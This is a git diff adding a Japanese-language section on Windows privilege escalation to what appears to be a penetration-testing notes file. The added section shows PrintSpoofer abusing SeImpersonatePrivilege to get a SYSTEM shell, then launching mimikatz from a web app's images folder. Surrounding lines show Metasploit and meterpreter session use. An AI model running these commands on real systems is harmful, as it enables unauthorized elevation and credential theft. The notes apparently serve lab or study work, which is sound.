@@ -701,3 +701,18 @@ msf6 post(multi/manage/autoroute) > sessions -i 2
 meterpreter > shell
 Process 7532 created.
 ```
+### printspoofer
+権限昇格(Win)  
+https://github.com/dievus/printspoofer
+```
+C:\wamp64\attendance\images>PrintSpoofer.exe -i -c cmd
+PrintSpoofer.exe -i -c cmd
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.19044.2251]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>C:\wamp64\attendance\images\mimikatz.exe
+C:\wamp64\attendance\images\mimikatz.exe
+```
